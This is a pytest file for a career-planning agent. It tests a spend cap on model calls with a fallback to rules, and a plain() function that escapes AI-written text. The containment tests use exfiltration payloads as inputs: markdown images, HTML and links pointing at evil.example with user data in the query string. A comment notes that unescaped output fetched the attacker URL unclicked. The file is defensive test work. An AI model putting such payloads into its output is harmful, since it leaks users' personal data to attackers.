"""Fix 3 (week 8, unbounded consumption): a budget per plan, held by the graph.

A call that could take the plan past CAREER_MAX_RUN_USD is never sent. That step
uses its rules version, the plan still passes check_plan, and the user is told.
All offline: the model is a fake that records calls. No API key, no cost.
"""
import os
import re
import sys
import uuid
from pathlib import Path
from types import SimpleNamespace

import pytest

os.environ["CAREER_FAKE"] = "1"
os.environ["CAREER_SEARCH_MODE"] = "bm25"
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from langgraph.types import Command  # noqa: E402

import llm_steps  # noqa: E402
from graph import build, config  # noqa: E402
from llm_steps import BudgetExceeded, SkillOrder  # noqa: E402

PROFILE = {"role": "Accounts Executive", "age": 41, "residency": "citizen",
           "status": "employed", "goal": "move into data analyst", "credit_balance": 0}


class FakeModel:
    """Stands in for Claude: every call bills 1,000 input + 2,000 output tokens ($0.022)."""
    def __init__(self):
        self.calls = 0

    def with_structured_output(self, schema, **_):
        return self

    def invoke(self, _messages):
        self.calls += 1
        raw = SimpleNamespace(usage_metadata={"input_tokens": 1000, "output_tokens": 2000})
        return {"raw": raw, "parsed": SkillOrder(order=["A"], reason="r")}


@pytest.fixture
def fake_model(monkeypatch):
    model = FakeModel()
    monkeypatch.setattr(llm_steps, "_model", lambda: model)
    monkeypatch.setattr(llm_steps, "MODEL_NAME", "anthropic:claude-sonnet-5-5")
    return model


def test_no_budget_set_means_no_cap(fake_model):
    for _ in range(30):                                   # standalone sub-agent evals (E3a/E3b)
        llm_steps._call(SkillOrder, "order these")
    assert fake_model.calls == 30


def test_calls_stop_before_the_cap_is_crossed(fake_model):
    with llm_steps.budget(0.0, cap_usd=0.10) as ledger:
        with pytest.raises(BudgetExceeded, match="spend cap reached"):
            while True:
                llm_steps._call(SkillOrder, "order these")
    # worst case per call ~$0.040 (4,000 output tokens): 0 / 0.022 / 0.044 + 0.040 fit; 0.066 + 0.040 does not
    assert fake_model.calls == 3
    assert ledger["spent"] <= 0.10 and ledger["capped"]


def test_budget_counts_what_the_run_already_spent(fake_model):
    with llm_steps.budget(0.48, cap_usd=0.50), pytest.raises(BudgetExceeded):
        llm_steps._call(SkillOrder, "order these")
    assert fake_model.calls == 0                          # refused before anything was sent


def test_budget_exceeded_is_handled_like_bad_output():
    # every AI step already falls back to rules on ValueError; no usage is charged for it
    assert issubclass(BudgetExceeded, ValueError)
    assert llm_steps.failed_usage(BudgetExceeded("x")) == []


def test_zero_budget_plan_uses_rules_and_says_so(monkeypatch):
    """With no budget the agent must never reach the API, yet still produce a checked plan."""
    def no_api():
        raise AssertionError("an AI call was sent despite the spend cap")
    monkeypatch.setenv("CAREER_FAKE", "0")
    monkeypatch.setattr(llm_steps, "_model", no_api)
    monkeypatch.setattr(llm_steps, "MAX_RUN_USD", 0.0)
    g, cfg = build(), config(uuid.uuid4().hex)
    g.invoke({"profile": PROFILE}, cfg)
    g.invoke(Command(resume={"role_id": 14}), cfg)
    out = g.invoke(Command(resume={"role_id": 723}), cfg)
    plan = out["__interrupt__"][0].value["plan"]          # plan() ran check_plan: it passed
    assert plan["spend"] == {"ai_cost_usd": 0, "cap_usd": 0.0, "capped": True}
    assert {"read_profile", "rank_paths", "order_skills"} <= set(out["fallbacks"])
    done = g.invoke(Command(resume={"approved": True}), cfg)
    assert "AI budget" in done["final_message"]


def test_normal_run_is_not_marked_capped():
    g, cfg = build(), config(uuid.uuid4().hex)            # CAREER_FAKE=1: rules, no cost
    g.invoke({"profile": PROFILE}, cfg)
    g.invoke(Command(resume={"role_id": 14}), cfg)
    out = g.invoke(Command(resume={"role_id": 723}), cfg)
    plan = out["__interrupt__"][0].value["plan"]
    assert plan["spend"]["capped"] is False and plan["spend"]["cap_usd"] == llm_steps.MAX_RUN_USD
    done = g.invoke(Command(resume={"approved": True}), cfg)
    assert "AI budget" not in done["final_message"]


# --------------------------------------------------------------------------
# Containment: AI- and catalogue-written text is shown as text (the trifecta's third leg)
# Checked in a real browser too: unescaped, Streamlit fetched the attacker URL 3 times
# with no click; through plain(), 0 requests and 0 links.
# --------------------------------------------------------------------------
from ui_art import plain  # noqa: E402


@pytest.mark.parametrize("text", [
    "Good fit ![x](http://evil.example/?d=age41)",           # image: fetched with no click
    "<img src='http://evil.example/?d=age41'>",              # raw HTML
    "see [here](https://evil.example)",                      # link
    "visit https://evil.example or WWW.evil.example",        # bare URLs become links too
])
def test_plain_leaves_no_working_link_or_image(text):
    out = plain(text)
    assert "![" not in out and "](" not in out
    assert not re.search(r"(?<!\\)<", out)                       # any "<" is escaped, so no HTML tag
    assert "://" not in out and "www." not in out.lower()


def test_plain_keeps_ordinary_text_readable():
    assert plain("Builds on your Excel skills; 3.5 h") == "Builds on your Excel skills; 3.5 h"
    assert plain("costs $5 vs $9") == "costs \\$5 vs \\$9"      # shown as $5 vs $9, not maths
    assert plain("# not a heading").startswith("\\#")
